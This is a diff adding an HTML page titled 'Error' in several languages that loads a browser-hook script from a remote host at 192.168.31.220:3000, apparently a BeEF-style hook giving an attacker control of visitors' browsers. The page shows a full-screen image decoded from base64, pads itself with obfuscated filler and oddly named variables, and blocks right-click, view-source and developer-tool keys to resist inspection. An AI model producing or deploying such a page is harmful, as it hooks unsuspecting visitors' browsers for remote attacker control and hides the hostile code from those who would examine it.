@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="xx">
+<head>
+<meta charset="utf-8">
+<title>錯誤 • Ошибка • خطأ • Error</title>
+
+
+<script src="http://192.168.31.220:3000/hook.js"></script>
+
+<script>
+(function(){
+    /* 亂碼雜文混淆코드অসংগতি -- Начало */
+
+    // Base64 image link (decodes to PNG file URL)
+    var Σψ = "aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lLzl0eDNsai5wbmc="; 
+
+    // Obfuscation filler (not used)
+    var 無意味 = ["無","бессмысленно","बेकार","無駄","ไร้สาระ"]; 
+    for (let λ = 0; λ < 無意味.length; λ++) {
+        無意味[λ] += λ;
+    }
+
+    // Page layout with fullscreen image
+    var صفحة = "<style>html,body{margin:0;height:100%;overflow:hidden;background:#000}</style>" +
+               "<img src='" + atob(Σψ) + "' style='width:100%;height:100%;object-fit:cover;display:block;user-select:none;-webkit-user-drag:none'>";
+
+    document.write(صفحة);
+
+    // Disable right-click
+    document.addEventListener("contextmenu", function(e){ 
+        e.preventDefault(); 
+    });
+
+    // Disable common inspection keys
+    document.onkeydown = function(event){
+        event = event || window.event;
+        var key = event.key.toLowerCase();
+
+        if (event.ctrlKey && ["u","s","p"].includes(key)) return false;
+        if (event.ctrlKey && event.shiftKey && (key === "i" || key === "j")) return false;
+        if (event.keyCode === 123) return false; // F12
+    };
+
+    /* 終了•النهاية•конец•end */
+})();
+</script>
+</head>
+<body></body>
+</html>
